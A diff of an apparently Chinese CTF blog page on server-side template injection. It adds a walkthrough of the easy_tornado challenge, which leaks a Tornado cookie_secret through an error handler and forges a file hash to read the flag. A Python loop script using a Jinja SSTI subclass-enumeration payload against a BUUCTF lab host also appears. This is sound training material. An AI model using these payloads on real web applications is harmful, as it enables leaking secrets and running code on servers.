@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/img/%E7%88%86%E7%88%86&%E8%89%BE%E5%85%8B(2).jpg">
 <meta property="article:published_time" content="2022-04-26T04:49:56.000Z">
-<meta property="article:modified_time" content="2022-05-14T12:36:43.820Z">
+<meta property="article:modified_time" content="2022-07-24T07:00:29.308Z">
 <meta property="article:author" content="7bmk">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
@@ -211,7 +211,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      6.9k 字
+      8k 字
     </span>
   
 
@@ -220,7 +220,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      58 分钟
+      67 分钟
     </span>
   
 
@@ -284,6 +284,14 @@
 <h1 id="脚本找出合适的类"><a href="#脚本找出合适的类" class="headerlink" title="脚本找出合适的类"></a>脚本找出合适的类</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 仅供参考，不是用来抄作业的</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">400</span>):<br>    url=<span class="hljs-string">&quot;http://61ef7259-23f5-43b3-8a0d-111f2e8a2c17.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[%d].__init__.__globals__&#125;&#125;&quot;</span><br>    response=res.get(url%i)<br>    <span class="hljs-comment">#BUUCTF中访问速度过快会返回429，此时就需要暂缓再访问</span><br>    <span class="hljs-keyword">if</span> response.status_code!=<span class="hljs-number">200</span>:<br>        time.sleep(<span class="hljs-number">0.3</span>)<br>        response=res.get(url%i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(response.text),i,response.status_code)<br>    <br></code></pre></td></tr></table></figure>
 
 
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>tornado是Python下的1个web模板框架<br>进入页面，发现以下可访问项:<br>&#x2F;flag.txt<br>&#x2F;welcome.txt<br>&#x2F;hints.txt<br>分别访问，结果如下:<br>页面: &#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;5623eec5b6308052633aef08ea7d497a<br>结果:<br>&#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag</p>
+<p>页面: &#x2F;file?filename&#x3D;&#x2F;welcome.txt&amp;filehash&#x3D;086cb0e1be24629a233966b3131a3443<br>结果:<br>&#x2F;welcome.txt<br>render</p>
+<p>页面: &#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;0af2fd6996c0cf35b0f7d6f3bd8b29b0<br>结果:<br>&#x2F;hints.txt<br>md5(cookie_secret+md5(filename))</p>
+<p>这个hint….有啥用? cookie_secret: balabala，说白了就是对文件进行哈希验证<br>思路: 根据观察hints.txt以及url的参数得知，需要找到cookie_secret，然后和md5(filename)拼接才能通过验证，查看flag</p>
+<p>存在msg参数(这个msg参数是怎么来的呢? 是发现在尝试注入报错后会返回这么个东西: <a target="_blank" rel="noopener" href="http://42f63a3c-968f-48fa-a487-ae00bcb04161.node4.buuoj.cn:81/error?msg=Error">http://42f63a3c-968f-48fa-a487-ae00bcb04161.node4.buuoj.cn:81/error?msg=Error</a>)<br>那么cookie_secret怎么来的呢? 这就考验你查阅官方文档(全tm英文)的能力了</p>
+<p>构造payload: error?msg&#x3D;    (这handler是啥我也8么学，看wp的)<br>就阔以获得cookie_secret了: {‘autoreload’: True, ‘compiled_template_cache’: False, ‘cookie_secret’: ‘3f239178-c592-4337-9b6a-4bf7d50d3a25’} </p>
+<p>md5(filename): 3bf9f6cf685a6dd8defadabfb41a03a1<br>md5(cookie_secret+md5(filename)): b5c5087056961d3c3b65dd600d92d43b<br>成功得到flag</p>
+
             </div>
             <hr>
             <div>
@@ -319,9 +327,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/04/30/%E5%88%B7%E9%A2%98-0x04/">
+                      <a href="/2022/05/11/miniL-ctf/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">刷题-0x04</span>
+                        <span class="hidden-mobile">miniL_ctf</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -329,8 +337,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/04/22/%E5%88%B7%E9%A2%98-0x03/">
-                        <span class="hidden-mobile">刷题-0x03</span>
+                      <a href="/2022/04/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+                        <span class="hidden-mobile">SSTI模板注入学习</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
